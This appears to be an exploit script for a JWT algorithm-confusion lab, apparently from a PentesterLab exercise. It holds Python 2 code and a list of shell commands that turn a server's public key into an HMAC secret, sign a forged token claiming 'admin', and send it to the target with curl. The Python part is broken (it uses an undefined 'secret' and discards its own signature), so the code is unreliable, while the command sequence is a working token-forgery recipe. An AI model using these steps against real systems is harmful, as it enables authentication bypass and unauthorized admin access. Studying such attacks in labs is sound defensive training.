import hashlib
import hmac
import base64
import sys

TOKEN = sys.argv[1]

header, payload, sig = TOKEN.split('.')

header = base64.b64decode(header)
payload = base64.b64decode(payload)
print header, payload

new_header = header.replace('=','')
new_payload = payload.replace('=','')

data = new_header+'.'+new_payload
sig = hmac.new(secret, data, digestmod=hashlib.sha256).digest()
sign = base64.urlsafe_b64encode(sig).replace('=','')


'''Commands to run to exploit vulnerability in JWT implementation:

-> cat public.pem | xxd -p | tr -d "\\n"
-> echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0="
-> echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0=" | openssl dgst -sha256 -mac HMAC -macopt hexkey:
-> python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('a444cab18a00ba7609968d00493dd44748267efa51680eb119d5c4da86a0d6ea')).replace('=', '')\")"
-> curl -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0=.pETKsYoAunYJlo0AST3UR0gmfvpRaA6xGdXE2oag1uo" http://ptl-4c907e2c-672c4030.libcurl.so/
'''
